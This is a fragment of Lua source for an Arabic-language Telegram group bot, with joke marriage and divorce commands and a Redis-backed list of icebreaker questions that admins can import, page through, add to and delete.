    local zwga_name = UserInfo.first_name
    local zwga_tag = '['..zwga_name..'](tg://user?id='..v..')'
    zwga_list = zwga_list.."- "..zwga_tag.."\n"
  end
  return send(msg_chat_id,msg_id,zwga_list,"md",true) 
end
-- tlaq
if text == "طلاق" or text == "تنزيل زوجتي" or text == "تزيل زوجي" and msg.reply_to_message_id ~= 0 then
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
  local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
  if tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
    return send(msg_chat_id,msg_id,"احا هو انت كنت اتزوجت نفسك عشان تطلق","md",true)  
  end
  if tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
    return send(msg_chat_id,msg_id,"هو احنا كنا اتزوجنا يروح خالتك عشان نطلق","md",true)  
  end
  if Redis:sismember(darket..msg_chat_id.."zwgat:",Message_Reply.sender.user_id) then
    Redis:srem(darket..msg_chat_id.."zwgat:",Message_Reply.sender.user_id)
    Redis:sadd(darket..msg_chat_id.."mutlqat:",Message_Reply.sender.user_id) 
    local rd_tmtlaq = {
      "تم طلاقكم للاسف",
      "تم الطلاق بلص ام عبير عاوزه تعرف اتطلقتو لي ؟",
      "تم الطلاق عشان المعلم مبيعرفش",
      "تم الطلاق عشان في سوسه دخلت وسطهم",
      "تم الطلاق بلص دا رقمي عشان لو حبيتي نتكلم باحترام 01234..."
    }
    return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_tmtlaq[math.random(#rd_tmtlaq)]).Reply,"md",true)  
    else
      local rd_tlaq = {
        "مكنتش اتزوجت عشان تطلق اصلا",
        "بايره محدش اتزوجها",
        "محدش عبرها قبل كدا اسسن"
      }
    return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_tlaq[math.random(#rd_tlaq)]).Reply,"md",true)  
    end
end
if text == "تاك للمطلقات" or text == "المطلقات" then
  local mutlqat_list = Redis:smembers(darket..msg_chat_id.."mutlqat:")
  if #mutlqat_list == 0 then 
    return send(msg_chat_id,msg_id,'٠ لايوجد مطلقات',"md",true) 
  end 
  local mutlqa_list = "٠ عدد المطلقات : "..#mutlqat_list.."\n٠ المطلقات :\n– – – – – – – –\n"
  for k, v in pairs(mutlqat_list) do
    local UserInfo = LuaTele.getUser(v)
    local mutlqa_name = UserInfo.first_name
    local mutlqa_tag = '['..mutlqa_name..'](tg://user?id='..v..')'
    mutlqa_list = mutlqa_list.."- "..mutlqa_tag.."\n"
  end
  return send(msg_chat_id,msg_id,mutlqa_list,"md",true) 
end
-- kit defullt
if text == "استيراد كت السورس" then
if Redis:get(darket.."kit_defullt:") == "true" then
    Redis:set(darket.."kit_defullt:","false")
    local d_kit = {"اخر افلام شاهدتها", 
"اخر افلام شاهدتها", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس داركت؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليش حسين ذكي؟ ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس داركت؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس داركت؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
  "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
"كم لك بالتلي؟ ",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغيير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالتليجرام؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
"تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغييرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغييره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
} 
for i = 1, #d_kit, 1 do
    Redis:sadd(darket.."kit:", d_kit[i])
end
return send(msg_chat_id,msg_id,"٠ تم استرداد "..#d_kit.." سؤال بنجاح","md",false, false, false, false, reply_markup)
end
if Redis:get(darket.."kit_defullt:") == "false" then
    return send(msg_chat_id,msg_id,"٠ تم استيرادها من قبل","md",false, false, false, false, reply_markup)
end
end
--kit add
if text == "اضف كت" then
    if not msg.Dev then
    return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
    end
    Redis:set(darket.."Set:kit"..msg.sender.user_id..":"..msg_chat_id,true)
    local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelkit'},
    },
    }
    }
    return send(msg_chat_id,msg_id,"٠ ارسل الان السؤال ","md",false, false, false, false, reply_markup)
    end
    if text and Redis:get(darket.."Set:kit"..msg.sender.user_id..":"..msg_chat_id) == "true" then
        Redis:del(darket.."Set:kit"..msg.sender.user_id..":"..msg_chat_id)
        Redis:sadd(darket.."kit:", text)
        return send(msg_chat_id,msg_id,"٠ تم حفظ السؤال","md",false, false, false, false, reply_markup)
    end
    if text == "داركت كت" then
        local list = Redis:smembers(darket.."kit:")
        randk = list[math.random(#list)]
        send(msg_chat_id, msg_id,'['..randk..']',"md",true)
        end
-- kit no.
if text == 'قائمه الكت' then
    if not msg.Dev then
    return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
    end
    if ChannelJoin(msg) == false then
    local chinfo = Redis:get(darket.."ch:admin")
    local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
    return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
    end
    local kit_list = Redis:smembers(darket.."kit:") 
    if #kit_list == 0 then
    return send(msg_chat_id,msg_id,"٠ لا يوجد اسأله, ","md",true)  
    end
    if #kit_list > 50 then
    local Listkit = '\n٠ قائمه الاسأله  \n٠ عدد الاسأله : '..#kit_list..'\n – – – – – – – –\n'
    for i = 1, 30, 1 do
        Listkit = Listkit.." - "..kit_list[i].."\n"
    end
    local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
            {{text = '- مسح الاسأله', data = msg.sender.user_id..'/rmkit_all'}},
            {{text = '- التالي', data = msg.sender.user_id..'/next/31'}}
        }
        }
        
    return send(msg_chat_id, msg_id, Listkit, 'md', false, false, false, false, reply_markup)
    end
    if #kit_list <= 50 then
        local Listkit = '\n٠ قائمه الاسأله  \n٠ عدد الاسأله : '..#kit_list..'\n – – – – – – – –\n'
        for i = 1, #kit_list, 1 do
            Listkit = Listkit.." - "..kit_list[i].."\n"
        end
        local reply_markup = LuaTele.replyMarkup{
            type = 'inline',
            data = {
                {{text = '- مسح الاسأله', data = msg.sender.user_id..'/rmkit_all'}},
            }
            }
            
        return send(msg_chat_id, msg_id, Listkit, 'md', false, false, false, false, reply_markup)
        end
end
-- kit Next
if Text and Text:match('(.*)/next/(.*)') then
    local m = {Text:match('(.*)/next/(.*)')}
    local UserId = m[1]
    local num = m[2]
    local anubis = num + 30
    local kit_list = Redis:smembers(darket.."kit:")
    local Residual = #kit_list - num
    if tonumber(IdUser) == tonumber(UserId) and Residual > 30 then
        local Listkit = '\n٠ قائمه الاسأله  \n٠ عدد الاسأله : '..#kit_list..'\n – – – – – – – –\n'
    for i = num, anubis, 1 do
        Listkit = Listkit.." - "..kit_list[i].."\n"
    end
    local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
            {{text = '- مسح الاسأله', data = UserId..'/rmkit_all'}},
            {{text = '- التالي', data = UserId..'/next/'..anubis}},
        }
        }
    edit(ChatId,Msg_id,Listkit, 'md', true, false, reply_markup)
    end
    if tonumber(IdUser) == tonumber(UserId) and Residual < 30 then
        local kit_end = num + Residual
        local Listkit = '\n٠ قائمه الاسأله  \n٠ عدد الاسأله : '..#kit_list..'\n – – – – – – – –\n'
    for i = num, kit_end, 1 do
        Listkit = Listkit.." - "..kit_list[i].."\n"
    end
    local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
            {{text = '- مسح الاسأله', data = UserId..'/rmkit_all'}},
           
        }
        }
    edit(ChatId,Msg_id,Listkit, 'md', true, false, reply_markup)
    end
    end
-- kit last back
if Text and Text:match('(.*)/l_back/(.*)') then
    local m = {Text:match('(.*)/l_back/(.*)')}
    local UserId = m[1]
    local num = m[2]
    local anubis = num - 30
    local kit_list = Redis:smembers(darket.."kit:")
    local Residual = #kit_list - num
    local back_r = Residual - 30
    if tonumber(IdUser) == tonumber(UserId) then
        local Listkit = '\n٠ قائمه الاسأله  \n٠ عدد الاسأله : '..#kit_list..'\n – – – – – – – –\n'
    for i = back_r, Residual, 1 do
        Listkit = Listkit.." - "..kit_list[i].."\n"
    end
    local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
            {{text = '- مسح الاسأله', data = UserId..'/rmkit_all'}},
            {{text = '- التالي', data = UserId..'/next/'..Residual}},
                    }
        }
    edit(ChatId,Msg_id,Listkit, 'md', true, false, reply_markup)
    end
end
-- kit back
if Text and Text:match('(.*)/back/(.*)') then
    local m = {Text:match('(.*)/back/(.*)')}
    local UserId = m[1]
    local num = m[2]
    local anubis = num - 30
    local kit_list = Redis:smembers(darket.."kit:")
    local Residual = #kit_list - num
    local back_r = Residual - 30
    if tonumber(IdUser) == tonumber(UserId) then
        local Listkit = '\n٠ قائمه الاسأله  \n٠ عدد الاسأله : '..#kit_list..'\n – – – – – – – –\n'
    for i = anubis, num, 1 do
        Listkit = Listkit.." - "..kit_list[i].."\n"
    end
    local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
            {{text = '- مسح الاسأله', data = UserId..'/rmkit_all'}},
            {{text = '- التالي', data = UserId..'/next/'..anubis}},
        }
        }
    edit(ChatId,Msg_id,Listkit, 'md', true, false, reply_markup)
    end
    if tonumber(IdUser) == tonumber(UserId) and Residual == #kit_list then
        local kit_end = num + Residual
        local Listkit = '\n٠ قائمه الاسأله  \n٠ عدد الاسأله : '..#kit_list..'\n – – – – – – – –\n'
    for i = 1, 30, 1 do
        Listkit = Listkit.." - "..kit_list[i].."\n"
    end
    local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
            {{text = '- مسح الاسأله', data = UserId..'/rmkit_all'}},
            {{text = '- التالي', data = UserId..'/next/31'}}
        }
        }
    edit(ChatId,Msg_id,Listkit, 'md', true, false, reply_markup)
    end
    end
-- kit rm
if text == "حذف كت" then
    if not msg.ControllerBot then
    return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
    end
    Redis:set(darket.."Set:kit"..msg.sender.user_id..":"..msg_chat_id, "rmkit")
    local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelkit'},
    },
    }
    }
    return send(msg_chat_id,msg_id,"٠ ارسل السؤال الذي تريد حذفه الان. ","md",false, false, false, false, reply_markup)
    end
    if text and Redis:get(darket.."Set:kit"..msg.sender.user_id..":"..msg_chat_id) == "rmkit" then
        Redis:del(darket.."Set:kit"..msg.sender.user_id..":"..msg_chat_id)
        Redis:srem(darket.."kit:", text)
        return send(msg_chat_id,msg_id,"٠ تم حذف السؤال","md",false, false, false, false, reply_markup)
    end
-- kit rm all
if text == 'مسح قائمه الكت' then
    if not msg.ControllerBot then
    return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
    end
    if ChannelJoin(msg) == false then
    local chinfo = Redis:get(darket.."ch:admin")
    local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
    return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
    end
    local kit_list = Redis:smembers(darket.."kit:") 
    if #kit_list == 0 then
    return send(msg_chat_id,msg_id,"٠ لا يوجد اسأله عشان امسحها يهبل","md",true)  
    end
    Redis:del(darket.."kit:")
    Redis:set(darket.."kit_defullt:","true")
    return send(msg_chat_id,msg_id,"٠ تم مسح جميع الاسأله بنجاح","md",true)
end
--by anubis
if text == "حذف رد" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
},
}
}
Redis:set(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,"true2")
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لحذفها من الردود","md",false, false, false, false, reply_markup)
end 
if text == "حذف رد متعدد" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
inlin = {
{{text = '- اضغط هنا للالغاء.',callback_data=msg.sender.user_id..'/cancelrdd'}},
}
send_inlin_key(msg_chat_id,"٠ ارسل الكلمه التي تريد حذفها",inlin,msg_id)
Redis:set(darket.."Set:array:rd"..msg.sender.user_id..":"..msg_chat_id,"delrd")
return false 
end
if text then
if  Redis:sismember(darket..'List:array',text) then
local list = Redis:smembers(darket.."Add:Rd:array:Text"..text)
quschen = list[math.random(#list)]
send(msg_chat_id, msg_id,'['..quschen..']',"md",true)
end
end
if text == ("الردود المتعدده") then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
local list = Redis:smembers(darket..'List:array')
text = "  ٠ قائمه الردود المتعدده \n•━━━━ darket ━━━━━•\n"
for k,v in pairs(list) do
text = text..""..k..">> ("..v..") ٠ {رساله}\n"
end
if #list == 0 then
text = "  ٠ لا يوجد ردود متعدده"
end
send(msg_chat_id, msg_id,'['..text..']',"md",true)
end
if text == ("مسح الردود المتعدده") then   
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
local list = Redis:smembers(darket..'List:array')
for k,v in pairs(list) do
Redis:del(darket.."Add:Rd:array:Text"..v..msg_chat_id)   
Redis:del(darket..'List:array'..msg_chat_id)
end
